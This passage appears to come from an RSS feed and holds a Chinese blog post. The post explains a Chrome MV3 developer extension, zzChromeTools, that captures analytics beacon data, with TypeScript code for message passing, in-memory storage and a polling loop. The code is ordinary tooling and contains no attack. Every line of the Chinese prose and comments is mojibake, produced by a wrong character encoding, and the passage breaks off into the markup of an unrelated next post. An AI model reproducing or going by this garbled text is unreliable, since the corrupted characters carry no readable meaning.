<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"message"</span>, <span class="hljs-function">(<span class="hljs-params">ev</span>) =&gt;</span> {
  <span class="hljs-comment">// ä¸¥æ ¼æ ¡éªŒ sourceï¼Œé˜²æ­¢æ¶æ„ç½‘é¡µä¼ªé€ æ•°æ®</span>
  <span class="hljs-keyword">if</span> (!ev.<span class="hljs-property">data</span> || ev.<span class="hljs-property">data</span>.<span class="hljs-property">source</span> !== <span class="hljs-string">"my-ext-beacon"</span>) {
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-keyword">const</span> { url, data } = ev.<span class="hljs-property">data</span>

  <span class="hljs-comment">// è§£æ dataï¼ˆå¯èƒ½æ˜¯ JSON å­—ç¬¦ä¸²ï¼‰</span>
  <span class="hljs-keyword">let</span> <span class="hljs-attr">parsedBody</span>: any
  <span class="hljs-keyword">try</span> {
    parsedBody = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-keyword">typeof</span> data === <span class="hljs-string">"string"</span> ? data : <span class="hljs-string">""</span>)
  } <span class="hljs-keyword">catch</span> {
    parsedBody = data
  }

  <span class="hljs-comment">// ç»„è£…ä¸€ä¸ª PingRecordï¼Œæå–å…³é”®ä¸šåŠ¡å­—æ®µ</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">newRecord</span>: <span class="hljs-title class_">PingRecord</span> = {
    <span class="hljs-attr">id</span>: <span class="hljs-title function_">v4</span>(),  <span class="hljs-comment">// ä½¿ç”¨ UUID ä¿è¯å”¯ä¸€æ€§</span>
    <span class="hljs-attr">time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toLocaleTimeString</span>(),
    <span class="hljs-attr">pagetype</span>: parsedBody?.<span class="hljs-property">pagetype</span> || <span class="hljs-string">""</span>,
    <span class="hljs-attr">actiontype</span>: parsedBody?.<span class="hljs-property">actiontype</span> || <span class="hljs-string">""</span>,
    <span class="hljs-attr">sectionId</span>: parsedBody?.<span class="hljs-property">backup</span>?.<span class="hljs-property">sectionId</span> || <span class="hljs-string">""</span>,
    <span class="hljs-attr">sortId</span>: parsedBody?.<span class="hljs-property">backup</span>?.<span class="hljs-property">sortId</span> || <span class="hljs-string">""</span>,
    <span class="hljs-attr">sortName</span>: parsedBody?.<span class="hljs-property">backup</span>?.<span class="hljs-property">sortName</span> || <span class="hljs-string">""</span>,
    <span class="hljs-attr">fullData</span>: parsedBody  <span class="hljs-comment">// ä¿ç•™å®Œæ•´æ•°æ®ä¾›è°ƒè¯•</span>
  }

  <span class="hljs-comment">// æŠŠè®°å½•å‘ç»™ background</span>
  <span class="hljs-title function_">sendToBackground</span>({
    <span class="hljs-attr">name</span>: <span class="hljs-string">"store-record"</span>,
    <span class="hljs-attr">body</span>: newRecord
  })
})
</code></pre>
<h4 data-id="heading-23">Step 2: Content Script -&gt; Service Worker (Plasmo Messaging)</h4>
<p>æˆ‘ä»¬ä½¿ç”¨ Plasmo æ¡†æ¶æä¾›çš„æ¶ˆæ¯ç³»ç»Ÿï¼Œå®ƒå°è£…äº† <code>chrome.runtime.sendMessage</code> å¹¶æä¾›äº†æ›´å¥½çš„ç±»å‹æ”¯æŒï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/background/messages/store-record.ts</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">PlasmoMessaging</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@plasmohq/messaging"</span>
<span class="hljs-keyword">import</span> { pingRecords, <span class="hljs-keyword">type</span> <span class="hljs-title class_">PingRecord</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"../pingRecord"</span>

<span class="hljs-comment">/** æ¥æ”¶ content-script å‘é€è¿‡æ¥çš„æ–°åŸ‹ç‚¹ï¼ŒæŠŠå®ƒå­˜è¿› pingRecords */</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">handler</span>: <span class="hljs-title class_">PlasmoMessaging</span>.<span class="hljs-property">MessageHandler</span> = <span class="hljs-keyword">async</span> (req, res) =&gt; {
  <span class="hljs-keyword">const</span> newRecord = req.<span class="hljs-property">body</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">PingRecord</span>

  <span class="hljs-comment">// æ”¯æŒæ¸…ç©ºæ“ä½œ</span>
  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span> === <span class="hljs-string">"clear"</span>) {
    pingRecords.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>, pingRecords.<span class="hljs-property">length</span>)
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// åœ¨é¡¶éƒ¨æ’å…¥ï¼ˆæ–°æ•°æ®åœ¨å‰ï¼‰</span>
    pingRecords.<span class="hljs-title function_">unshift</span>(newRecord)
  }

  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">"ok"</span>)
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> handler
</code></pre>
<h4 data-id="heading-24">Step 3: Service Worker çš„å†…å­˜ç®¡ç†</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/background/pingRecord.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">PingRecord</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">time</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">pagetype</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">actiontype</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">sectionId</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">sortId</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">sortName</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">fullData</span>: <span class="hljs-built_in">any</span>
}

<span class="hljs-comment">/** å…¨å±€åªåœ¨å†…å­˜ä¸­ä¿å­˜ï¼Œåˆ·æ–°/é‡å¯åä¼šä¸¢å¤± */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">pingRecords</span>: <span class="hljs-title class_">PingRecord</span>[] = []
</code></pre>
<h4 data-id="heading-25">Step 4: Service Worker -&gt; DevTools Panel (è½®è¯¢ç­–ç•¥)</h4>
<p>è¿™æ˜¯æœ€å…³é”®çš„è®¾è®¡å†³ç­–ã€‚æˆ‘ä»¬æ²¡æœ‰é€‰æ‹©é•¿è¿æ¥ï¼ˆ<code>connect</code>ï¼‰ï¼Œè€Œæ˜¯é€‰æ‹©äº†<strong>çŸ­è½®è¯¢ï¼ˆPollingï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/components/panels/SpmTools/index.tsx</span>
<span class="hljs-keyword">import</span> { sendToBackground } <span class="hljs-keyword">from</span> <span class="hljs-string">"@plasmohq/messaging"</span>

<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">let</span> <span class="hljs-attr">intervalId</span>: <span class="hljs-built_in">number</span>

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchRecords</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// è·å–åŸ‹ç‚¹è®°å½•</span>
    sendToBackground&lt;<span class="hljs-title class_">PingRecord</span>[]&gt;({
      <span class="hljs-attr">name</span>: <span class="hljs-string">"get-records"</span>
    }).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(res)) {
        <span class="hljs-title function_">setRecords</span>(res)
        <span class="hljs-comment">// æ›´æ–°è¿‡æ»¤å™¨é€‰é¡¹...</span>
      }
    })

    <span class="hljs-comment">// æ£€æŸ¥ç›‘æ§çŠ¶æ€</span>
    chrome.<span class="hljs-property">devtools</span>.<span class="hljs-property">inspectedWindow</span>.<span class="hljs-built_in">eval</span>(
      <span class="hljs-string">"window.__is_spm_monitor_open__"</span>,
      <span class="hljs-function">(<span class="hljs-params">result: <span class="hljs-built_in">boolean</span>, isException</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (!isException) {
          <span class="hljs-title function_">setIsSpmMonitorOpen</span>(result)
        }
      }
    )
  }

  <span class="hljs-title function_">fetchRecords</span>()  <span class="hljs-comment">// å…ˆæ‹‰ä¸€æ¬¡</span>

  <span class="hljs-comment">// æ¯ 800ms è½®è¯¢ä¸€æ¬¡</span>
  intervalId = <span class="hljs-variable language_">window</span>.<span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">fetchRecords</span>()
  }, <span class="hljs-number">800</span>)

  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(intervalId)
}, [])
</code></pre>
<p>æ¶ˆæ¯å¤„ç†å™¨æå…¶ç®€æ´ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/background/messages/get-records.ts</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">PlasmoMessaging</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@plasmohq/messaging"</span>
<span class="hljs-keyword">import</span> { pingRecords } <span class="hljs-keyword">from</span> <span class="hljs-string">"../pingRecord"</span>

<span class="hljs-keyword">const</span> <span class="hljs-attr">handler</span>: <span class="hljs-title class_">PlasmoMessaging</span>.<span class="hljs-property">MessageHandler</span> = <span class="hljs-keyword">async</span> (req, res) =&gt; {
  <span class="hljs-comment">// ç›´æ¥æŠŠå†…å­˜ä¸­ä¿å­˜çš„åŸ‹ç‚¹åˆ—è¡¨è¿”å›</span>
  res.<span class="hljs-title function_">send</span>(pingRecords)
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> handler
</code></pre>
<p>DevTools Panel æ‰“å¼€æ—¶ï¼Œæ¯éš” <strong>800ms</strong> è°ƒç”¨ä¸€æ¬¡ <code>chrome.runtime.sendMessage({ action: "get_records" })</code>ã€‚ Service Worker æ”¶åˆ°è¯·æ±‚ï¼Œè¿”å› <code>pingRecords</code>ï¼Œå¹¶æ¸…ç©ºå·²å‘é€çš„è®°å½•ï¼ˆæˆ–ä¿ç•™æ ¹æ®éœ€æ±‚ï¼‰ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆæ˜¯è½®è¯¢ï¼Ÿ</strong></p>
<ol>
<li><strong>å¯¹æŠ— Service Worker ä¼‘çœ ï¼š</strong> è½®è¯¢æ˜¯æ— çŠ¶æ€çš„ã€‚å³ä½¿ SW ä¼‘çœ äº†ï¼Œä¸‹ä¸€æ¬¡è½®è¯¢è¯·æ±‚ä¼šè‡ªåŠ¨å”¤é†’å®ƒã€‚</li>
<li><strong>ç®€å•å¯é ï¼š</strong> é¿å…äº†å¤æ‚çš„è¿æ¥æ–­å¼€é‡è¿é€»è¾‘ã€‚</li>
<li><strong>æ€§èƒ½æ— æŸï¼š</strong> 800ms çš„é¢‘ç‡å¯¹äºç°ä»£ CPU æ¥è¯´ï¼Œè´Ÿè½½å‡ ä¹ä¸º 0ã€‚ä¸”æ•°æ®åªæ˜¯å†…å­˜è¯»å–ï¼Œå»¶è¿Ÿåœ¨çº³ç§’çº§ã€‚</li>
</ol>
<h3 data-id="heading-26">è¾…åŠ©ï¼šåŸºäº Plasmo çš„å·¥ç¨‹åŒ–å®è·µ</h3>
<p>æˆ‘ä»¬å¼•å…¥äº† <strong>Plasmo</strong> æ¡†æ¶æ¥æ„å»ºæ•´ä¸ªæ’ä»¶ã€‚Plasmo è¢«ç§°ä¸º"æµè§ˆå™¨æ’ä»¶é¢†åŸŸçš„ Next.js"ã€‚å®ƒæä¾›äº†ï¼š</p>
<ul>
<li><strong>çƒ­é‡è½½ï¼ˆHMRï¼‰</strong>ï¼šå¼€å‘æ—¶ä¿®æ”¹ä»£ç æ— éœ€é‡æ–°åŠ è½½æ‰©å±•</li>
<li><strong>React æ”¯æŒ</strong>ï¼šä½¿ç”¨ Ant Design æ„å»º DevTools é¢æ¿ UI</li>
<li><strong>TypeScript å¼€ç®±å³ç”¨</strong>ï¼šå®Œæ•´çš„ç±»å‹æ”¯æŒ</li>
<li><strong>æ¶ˆæ¯ç³»ç»Ÿå°è£…</strong>ï¼š<code>@plasmohq/messaging</code> ç®€åŒ–äº†è·¨ä¸Šä¸‹æ–‡é€šä¿¡</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9093821bc17f4a14bc4a4b2ad1b9d93c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=DGbBzIwt2uB67SormliJwRh4KRM%3D" alt="ä¸ºä»€ä¹ˆä½¿ç”¨ Plasmo" loading="lazy"/></p>
<h3 data-id="heading-27">å®é™…ä½¿ç”¨ä½“éªŒ</h3>
<p><strong>ä½¿ç”¨æµç¨‹</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b75a13d97484224812df21bd6abf590~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=fQJqfSaWISLh25ziG3StZA0oT9k%3D" alt="å¿«é€Ÿå¼€å§‹æµç¨‹" loading="lazy"/></p>
<p><strong>å¼€å¯æ§åˆ¶å°é¢æ¿ -&gt; é€‰æ‹© zzChromeTools</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82f4070641324ff594a6ce7ed6feddfa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=MrabshH79iShIj9%2Fz7JLcPab3s0%3D" alt="æµç¨‹1" loading="lazy"/></p>
<p><strong>æ ¹æ®éœ€æ±‚å‹¾é€‰èƒ½åŠ›</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f08eca307bf04d56b89ea00230ecaa0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=DiAR1cA079OxuZKQSvRUlLMAkGs%3D" alt="æµç¨‹2" loading="lazy"/></p>
<p><strong>åœ¨é¡µé¢ä¸Šè§¦å‘åŸ‹ç‚¹</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3183f2cbf5aa4ac798fd814cc95fbdc1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=Sc9VN8tMFngnuLMo0c56pgmEp8o%3D" alt="æµç¨‹3" loading="lazy"/></p>
<p><strong>ç­›é€‰æ•°æ® / æ¸…ç©ºæ•°æ®</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a99ab784c99340c5b042ed51d35d4ac8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=GVLt0l%2F%2BFshTuQgHgYRI5BRO0Oo%3D" alt="æµç¨‹4" loading="lazy"/></p>
<p><strong>æ—¶æ•ˆå¯¹æ¯”</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/192bc9dcf3294c4598883fff31a1e2c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=s39HVsq39dkv7sf3cpLin16sZyQ%3D" alt="æ—¶æ•ˆå¯¹æ¯”" loading="lazy"/></p>
<h2 data-id="heading-28">06 ä»·å€¼</h2>
<p><strong>zzChromeTools</strong> ä¸ä»…ä»…æ˜¯ä¸€ä¸ªä»£ç çš„å †ç Œï¼Œå®ƒä»£è¡¨äº†æˆ‘ä»¬å¯¹å‰ç«¯å·¥ç¨‹åŒ–çš„æ·±åº¦æ€è€ƒã€‚æˆ‘ä»¬å°†å®ƒçš„ä»·å€¼æ¦‚æ‹¬ä¸ºä¸‰ä¸ªç»´åº¦ï¼š</p>
<h3 data-id="heading-29">æ—¶é—´ç»´åº¦çš„ä»·å€¼</h3>
<ul>
<li><strong>æ—§æµç¨‹ï¼š</strong> æŸ¥æ‰¾ï¼ˆ1minï¼‰+ è§£æï¼ˆ1minï¼‰+ éªŒè¯ï¼ˆ1minï¼‰= <strong>3 åˆ†é’Ÿ/ä¸ª</strong>ã€‚</li>
<li><strong>æ–°æµç¨‹ï¼š</strong> æ‰“å¼€é¢æ¿ï¼Œè‡ªåŠ¨é«˜äº® = <strong>5 ç§’/ä¸ª</strong>ã€‚ å¦‚æœä¸€ä¸ªé¡¹ç›®æœ‰ 50 ä¸ªåŸ‹ç‚¹ï¼Œæˆ‘ä»¬ç›´æ¥èŠ‚çœäº† <strong>2.5 å°æ—¶</strong> çš„çº¯åƒåœ¾æ—¶é—´ã€‚å¯¹äºä¸€ä¸ª 10 äººçš„å‰ç«¯å›¢é˜Ÿï¼Œä¸€å¹´èŠ‚çœçš„å·¥æ—¶æˆæœ¬æ˜¯éå¸¸å¯è§‚çš„ã€‚</li>
</ul>
<h3 data-id="heading-30">å¿ƒç†ç»´åº¦çš„ä»·å€¼</h3>
<p>è¿™æ— æ³•ç”¨ KPI è¡¡é‡ï¼Œä½†æœ€ä¸ºé‡è¦ã€‚ å·¥å…·çš„â€œé¡ºæ‰‹ç¨‹åº¦â€ç›´æ¥å½±å“å¼€å‘è€…çš„å¹¸ç¦æ„Ÿã€‚å½“å·¥å…·èƒ½å¤Ÿåƒå‘¼å¸ä¸€æ ·è‡ªç„¶æ—¶ï¼Œå¼€å‘è€…å¯ä»¥å°†å®è´µçš„æ³¨æ„åŠ›ï¼ˆAttentionï¼‰é›†ä¸­åœ¨ä¸šåŠ¡é€»è¾‘å’Œæ¶æ„è®¾è®¡ä¸Šï¼Œè€Œä¸æ˜¯è¢«çäº‹æ‰“æ–­ã€‚ <strong>æˆ‘ä»¬æ¶ˆç­äº†â€œå™ªéŸ³â€ï¼Œç•™ä¸‹äº†â€œä¿¡å·â€ã€‚</strong> è¿™ç§æ¸…çˆ½çš„è°ƒè¯•ä½“éªŒï¼Œèƒ½è®©å¼€å‘è€…åœ¨é¢å¯¹ç¹ççš„åŸ‹ç‚¹éœ€æ±‚æ—¶ï¼Œå°‘ä¸€åˆ†ç„¦è™‘ï¼Œå¤šä¸€åˆ†ä»å®¹ã€‚</p>
<h3 data-id="heading-31">èµ„äº§ç»´åº¦çš„ä»·å€¼</h3>
<p>è¿™ä¸ªæ’ä»¶çš„æ¶æ„æœ¬èº«å°±æ˜¯ä¸€ä»½å®è´µçš„æŠ€æœ¯èµ„äº§ã€‚</p>
<ul>
<li>å®ƒéªŒè¯äº† MV3 æ¶æ„ä¸‹å¤æ‚é€šä¿¡çš„å¯è¡Œæ€§ã€‚</li>
<li>å®ƒæä¾›äº†ä¸€å¥—æ ‡å‡†åŒ–çš„â€œä¸»ä¸–ç•Œæ³¨å…¥â€æ¨¡æ¿ï¼Œæœªæ¥å¯ä»¥æ‰©å±•ç”¨äºå…¶ä»–åœºæ™¯ï¼ˆå¦‚æ€§èƒ½ç›‘æ§ SDK çš„è°ƒè¯•ã€AB Test æ ‡è®°çš„æŸ¥çœ‹ç­‰ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-32">What's more</h3>
<p>zzChromeToolsé™¤äº†åŸ‹ç‚¹æ ¡éªŒä¹‹å¤–ï¼Œè¿˜æœ‰å¦‚ä¸‹å°å·¥å…·ç”¨äºææ•ˆå‰ç«¯å¼€å‘ï¼š</p>
<ol>
<li><strong>å¸¸ç”¨å·¥ç¨‹è·³è½¬/äºŒç»´ç </strong></li>
</ol>
<h2 data-id="heading-33"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5bf33bc3edf44ce899bd0abc338a0c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=cxDxi19ThVKepgbmVhj37uev9dE%3D" alt="æœªå‘½ä¸­å·¥ç¨‹é“¾æ¥æ—¶ï¼Œå±•ç¤ºè®°å½•å·¥ç¨‹" loading="lazy"/></h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95dd097fcb2849f0bf73b881ef26889d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=GodMdVViS0FITKbrc7c4IbfGBTs%3D" alt="å‘½ä¸­å·¥ç¨‹é“¾æ¥æ—¶ï¼Œå±•ç¤ºå·¥ç¨‹å­é¡µé¢" loading="lazy"/></p>
<p><strong>Whistle ä»£ç†ä¸€é”®åˆ‡æ¢</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ded8c4cfa6e468c8db518b59274bf8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=RfsVfeNZdCB2wMFu4vsE2bsQRzU%3D" alt="*Whistle ä»£ç†ä¸€é”®åˆ‡æ¢" loading="lazy"/></p>
<p><strong>ä¸€é”®åˆ†æå½“å‰é¡µé¢å­—ä½“</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de19d0218e9f4ea8a37ddd6da3ea09ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=BbL%2FIwYdGrcXnXdTibIPIrRUZgk%3D" alt="ä¸€é”®åˆ†æå½“å‰é¡µé¢å­—ä½“" loading="lazy"/></p>
<p><strong>JSON å±‚çº§æŸ¥æ‰¾å·¥å…·</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d08b85cc0d114ae0a62f1bc215277042~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=ndn8eGA4XaV8M7gMQgHyPIIHkfE%3D" alt="JSON å±‚çº§æŸ¥æ‰¾å·¥å…·" loading="lazy"/></p>
<h2 data-id="heading-34">07 ç»“è®ºä¸æœªæ¥å±•æœ›</h2>
<p>å¼€å‘ <strong>zzChromeTools</strong> çš„è¿‡ç¨‹ï¼Œæ˜¯æˆ‘ä»¬ä¸æ»¡äºä½æ•ˆçš„ç°çŠ¶ï¼Œä½†ä¸é€šè¿‡æŠ±æ€¨æ¥å‘æ³„ï¼Œè€Œæ˜¯é€šè¿‡æŠ€æœ¯æ‰‹æ®µå»æ”¹å˜å®ƒçš„ä½“ç°ã€‚</p>
<h3 data-id="heading-35">æœªæ¥ Roadmap</h3>
<p>è™½ç„¶ç›®å‰çš„ç‰ˆæœ¬å·²ç»è§£å†³äº† 80% çš„ç—›ç‚¹ï¼Œä½†æˆ‘ä»¬ä»æœ‰æ›´å®å¤§çš„è®¡åˆ’ï¼š</p>
<ol>
<li><strong>æŒä¹…åŒ–å­˜å‚¨å‡çº§ï¼š</strong> å¼•å…¥ <code>IndexedDB</code>ï¼Œå½»åº•è§£å†³ Service Worker é‡å¯å¯èƒ½å¯¼è‡´æç«¯æƒ…å†µä¸‹æ•°æ®ä¸¢å¤±çš„é—®é¢˜ï¼Œæ”¯æŒä¿å­˜å‡ å¤©çš„åŸ‹ç‚¹å†å²ï¼Œæ–¹ä¾¿å›æº¯ã€‚</li>
<li><strong>å…¨åè®®è¦†ç›–ï¼š</strong> é™¤äº† <code>sendBeacon</code>ï¼Œè¿˜å°† Hook <code>XMLHttpRequest</code> å’Œ <code>fetch</code>ï¼Œå®ç°å¯¹æ‰€æœ‰ç±»å‹ä¸ŠæŠ¥çš„æ— æ­»è§’è¦†ç›–ã€‚</li>
<li><strong>è‡ªåŠ¨åŒ–æµ‹è¯•é›†æˆï¼š</strong> æ¢ç´¢æš´éœ² API ç»™ Puppeteer/Playwrightï¼Œè®©è‡ªåŠ¨åŒ–æµ‹è¯•è„šæœ¬ä¹Ÿèƒ½è¯»å–æ’ä»¶æ•è·çš„åŸ‹ç‚¹æ•°æ®ï¼Œå®ç°åŸ‹ç‚¹å›å½’çš„è‡ªåŠ¨åŒ–ã€‚</li>
</ol>
<h3 data-id="heading-36">ç»“è¯­</h3>
<p>Chrome MV3 æ˜¯ä¸€å µå¢™ï¼Œä½†æŠ€æœ¯ä¸ä»…èƒ½ç Œå¢™ï¼Œä¹Ÿèƒ½æ¶æ¡¥ã€‚ é€šè¿‡å¯¹åº•å±‚åŸç†çš„æ·±å…¥æŒ–æ˜ï¼Œæˆ‘ä»¬è¯æ˜äº†å³ä½¿åœ¨æœ€ä¸¥æ ¼çš„å®‰å…¨é™åˆ¶ä¸‹ï¼Œä¾ç„¶å¯ä»¥æ‰“é€ å‡ºæè‡´çš„å¼€å‘è€…å·¥å…·ã€‚ å¸Œæœ›æœ¬æ–‡èƒ½ç»™ä½ å¸¦æ¥ä¸¤æ–¹é¢çš„æ”¶è·ï¼šä¸€æ˜¯å…³äº Chrome æ’ä»¶å¼€å‘çš„ç¡¬æ ¸çŸ¥è¯†ï¼ŒäºŒæ˜¯ä¸€ç§â€œä¸å‡‘åˆã€ä¸å¦¥åâ€çš„æå®¢ç²¾ç¥ã€‚</p>
<p><strong>æ‹’ç»æ— æ•ˆåŠ ç­ï¼Œä»æ‰“ç£¨æ‰‹ä¸­çš„æ­¦å™¨å¼€å§‹ã€‚</strong></p>
<blockquote>
<p>è½¬è½¬ç ”å‘ä¸­å¿ƒåŠä¸šç•Œå°ä¼™ä¼´ä»¬çš„æŠ€æœ¯å­¦ä¹ äº¤æµå¹³å°ï¼Œå®šæœŸåˆ†äº«ä¸€çº¿çš„å®æˆ˜ç»éªŒåŠä¸šç•Œå‰æ²¿çš„æŠ€æœ¯è¯é¢˜ã€‚ å…³æ³¨å…¬ä¼—å·ã€Œè½¬è½¬æŠ€æœ¯ã€ï¼ˆç»¼åˆæ€§ï¼‰ã€ã€Œå¤§è½¬è½¬FEã€ï¼ˆä¸“æ³¨äºFEï¼‰ã€ã€Œè½¬è½¬QAã€ï¼ˆä¸“æ³¨äºQAï¼‰ï¼Œæ›´å¤šå¹²è´§å®è·µï¼Œæ¬¢è¿äº¤æµåˆ†äº«~</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¹¼å„¿å›­å‰ç«¯ #11ï¼šè¡¨æ ¼æ ‡ç­¾ <table> â€”â€” åˆ«æ‹¿å®ƒåšå¸ƒå±€ï¼Œä½†å±•ç¤ºæ•°æ®å®ƒæ˜¯çš„ç¥ï¼]]></title>    <link>https://juejin.cn/post/7597739723805917226</link>    <guid>https://juejin.cn/post/7597739723805917226</guid>    <pubDate>2026-01-22T04:20:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597739723805917226" data-draft-id="7597746390435151908" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¹¼å„¿å›­å‰ç«¯ #11ï¼šè¡¨æ ¼æ ‡ç­¾ &lt;table&gt; â€”â€” åˆ«æ‹¿å®ƒåšå¸ƒå±€ï¼Œä½†å±•ç¤ºæ•°æ®å®ƒæ˜¯çš„ç¥ï¼"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-22T04:20:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Flinton"/> <meta 